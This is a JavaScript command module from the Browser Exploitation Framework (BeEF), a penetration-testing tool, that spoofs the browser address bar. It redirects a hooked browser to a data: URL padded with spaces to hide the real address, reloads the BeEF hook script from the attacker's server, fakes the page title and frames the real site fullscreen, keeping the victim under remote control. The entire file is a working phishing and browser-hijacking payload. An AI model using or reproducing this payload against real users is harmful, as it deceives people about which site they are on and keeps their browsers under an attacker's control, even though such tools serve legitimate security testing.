//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var hook = beef.net.httpproto + "://" + beef.net.host + ":" + beef.net.port + beef.net.hook;

  try {
    window.location = "data:text/html,<%= @spoofed_url %><%= ' '*1337 %>?<script src='"+hook+"'></script><script>document.title='<%= @spoofed_url %>';beef.dom.createIframe('fullscreen',{'src':'<%= @real_url %>'},{},null);</script>"
    beef.debug("[Spoof Address Bar (data)] Redirecting to data URL...");
  } catch (e) {
    beef.debug("[Spoof Address Bar (data)] could not redirect: "+e.message)
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=something went horribly wrong: " + e.message, beef.are.status_error());
  }

});
